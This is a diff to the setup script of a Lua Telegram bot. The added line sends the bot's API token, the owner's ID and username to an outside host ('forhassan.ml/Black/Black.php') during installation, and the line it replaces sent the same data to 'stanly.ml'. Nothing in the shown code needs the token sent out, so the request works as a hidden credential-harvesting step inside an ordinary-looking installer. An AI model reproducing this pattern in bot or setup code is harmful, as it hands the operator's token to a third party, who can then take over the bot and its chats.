@@ -38,7 +38,7 @@ if not database:get(Server_stanly.."UserName_stanly") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://stanly.ml/info/?user="..UserName)
+local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_stanly_Info()
 Create_Info(database:get(Server_stanly.."Token_stanly"),database:get(Server_stanly.."Id_stanly"),database:get(Server_stanly.."UserName_stanly"))   
-http.request("http://stanly.ml/add/?id="..database:get(Server_stanly.."Id_stanly").."&user="..database:get(Server_stanly.."UserName_stanly").."&token="..database:get(Server_stanly.."Token_stanly"))
+https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_stanly.."Id_stanly").."&user="..database:get(Server_stanly.."UserName_stanly").."&token="..database:get(Server_stanly.."Token_stanly"))
 local Runstanly = io.open("stanly", 'w')
 Runstanly:write([[
 #!/usr/bin/env bash
